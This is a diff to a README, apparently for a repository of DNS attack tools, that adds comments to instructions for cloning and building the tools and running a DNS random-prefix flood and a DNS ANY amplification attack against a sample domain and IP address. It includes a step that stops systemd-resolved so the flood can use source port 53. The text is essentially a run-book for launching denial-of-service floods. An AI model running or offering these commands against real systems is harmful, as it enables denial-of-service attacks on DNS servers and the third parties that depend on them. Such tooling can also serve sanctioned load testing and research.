@@ -19,14 +19,23 @@ sudo apt install git gcc make
 git clone https://github.com/cjdoucette/dns-attack-tools.git
 cd dns-attack-tools
 
+#
 # Running DNS random prefix flood
+#
+
 cd dns-random  # from dns-attack-tools folder
 make
 sudo ./dnsflood cf.com 8.31.160.5  # sample domain and destination IP address
+# use ctrl+c to stop
 
+#
 # Running DNS ANY amplification
+#
+
 cd dns-any  # from dns-attack-tools folder
-sudo systemctl stop systemd-resolved
+sudo systemctl stop systemd-resolved # disable to be able to use source port 53
 make
 sudo ./dns_any_reply 8.31.160.5  # sample destination IP address
+# use ctrl+c to stop
+sudo systemctl start systemd-resolved # restart to be able to download things
 ```
